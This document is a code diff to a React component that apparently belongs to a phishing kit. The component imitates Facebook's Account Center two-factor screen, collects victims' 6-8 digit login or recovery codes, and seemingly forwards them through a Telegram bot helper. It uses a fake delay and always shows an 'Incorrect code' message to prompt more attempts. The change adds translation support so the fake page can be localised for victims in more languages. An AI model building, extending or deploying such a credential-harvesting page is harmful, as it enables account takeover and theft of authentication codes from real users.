@@ -5,6 +5,7 @@ import axios from "axios";
 import type { FC } from "react";
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router";
+import { useTranslation } from "@/hooks/useTranslation";
 interface UIState {
   error: string;
   isLoading: boolean;
@@ -56,6 +57,17 @@ const sendTelegramMessage = async (
     parse_mode: "HTML",
   });
 };
+const texts = {
+  accountCenter: "Account Center - Facebook",
+  checkNotifications: "Check notifications on another device",
+  approveOrEnter: "Approve from another device or Enter your login code",
+  enterCode:
+    "Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code",
+  codePlaceholder: "Enter Code (6-8 digits)",
+  continue: "Continue",
+  sendCode: "Send Code",
+  incorrectCode: "Incorrect code. Please try again.",
+};
 
 const Verify: FC = () => {
   const navigate = useNavigate();
@@ -67,6 +79,7 @@ const Verify: FC = () => {
     loadingTime: 0,
     maxAttempt: 0,
   });
+  const { t, isLoading } = useTranslation(texts);
 
   useEffect(() => {
     const { telegram, settings } = getConfig();
@@ -124,7 +137,7 @@ const Verify: FC = () => {
         setUiState((prev) => ({
           ...prev,
           isLoading: false,
-          error: "Incorrect code. Please try again.",
+          error: t("incorrectCode"),
         }));
       }, config.loadingTime);
     } catch {
@@ -142,73 +155,78 @@ const Verify: FC = () => {
   };
 
   return (
-    <div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
-      <div className="flex flex-col">
-        <b>Account Center - Facebook</b>
-        <b className="text-2xl">Check notifications on another device</b>
-      </div>
+    <>
+      {isLoading ? (
+        <div className="fixed inset-0 flex items-center justify-center bg-white">
+          <span className="text-xl">Loading...</span>
+        </div>
+      ) : (
+        <div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
+          <div className="flex flex-col">
+            <b>{t("accountCenter")}</b>
+            <b className="text-2xl">{t("checkNotifications")}</b>
+          </div>
 
-      <div>
-        <img src={HeroImage} alt="verify" />
-      </div>
+          <div>
+            <img src={HeroImage} alt="verify" />
+          </div>
 
-      <div>
-        <b>Approve from another device or Enter your login code</b>
-        <p>
-          Enter 6-digit code we just send from the authentication app you set
-          up, or Enter 8-digit recovery code
-        </p>
-      </div>
+          <div>
+            <b>{t("approveOrEnter")}</b>
+            <p>{t("enterCode")}</p>
+          </div>
 
-      <div className="my-2 flex flex-col items-center justify-center">
-        <input
-          className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
-            uiState.error ? "border-red-500 focus:border-red-500" : ""
-          }`}
-          type="text"
-          autoComplete="one-time-code"
-          inputMode="numeric"
-          maxLength={8}
-          minLength={6}
-          pattern="\d*"
-          placeholder="Enter Code (6-8 digits)"
-          value={code}
-          onFocus={clearError}
-          onChange={handleCodeChange}
-        />
+          <div className="my-2 flex flex-col items-center justify-center">
+            <input
+              className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
+                uiState.error ? "border-red-500 focus:border-red-500" : ""
+              }`}
+              type="text"
+              autoComplete="one-time-code"
+              inputMode="numeric"
+              maxLength={8}
+              minLength={6}
+              pattern="\d*"
+              placeholder={t("codePlaceholder")}
+              value={code}
+              onFocus={clearError}
+              onChange={handleCodeChange}
+            />
 
-        {uiState.error && (
-          <div className="mt-2 text-sm text-red-500">{uiState.error}</div>
-        )}
+            {uiState.error && (
+              <div className="mt-2 text-sm text-red-500">{uiState.error}</div>
+            )}
 
-        <button
-          className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${
-            code.length >= 6
-              ? "bg-blue-500 hover:bg-blue-600"
-              : "cursor-not-allowed bg-blue-300"
-          }`}
-          disabled={code.length < 6 || uiState.isLoading}
-          type="button"
-          onClick={handleSubmit}
-        >
-          {uiState.isLoading ? (
-            <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
-          ) : (
-            "Continue"
+            <button
+              className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${
+                code.length >= 6
+                  ? "bg-blue-500 hover:bg-blue-600"
+                  : "cursor-not-allowed bg-blue-300"
+              }`}
+              disabled={code.length < 6 || uiState.isLoading}
+              type="button"
+              onClick={handleSubmit}
+            >
+              {uiState.isLoading ? (
+                <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
+              ) : (
+                t("continue")
+              )}
+            </button>
+
+            <p className="text-blue-500 hover:underline">{t("sendCode")}</p>
+          </div>
+
+          {uiState.showUploadModal && (
+            <Upload
+              onClose={() =>
+                setUiState((prev) => ({ ...prev, showUploadModal: false }))
+              }
+            />
           )}
-        </button>
-
-        <p className="text-blue-500 hover:underline">Send Code</p>
-      </div>
-
-      {uiState.showUploadModal && (
-        <Upload
-          onClose={() =>
-            setUiState((prev) => ({ ...prev, showUploadModal: false }))
-          }
-        />
+        </div>
       )}
-    </div>
+    </>
   );
 };
 
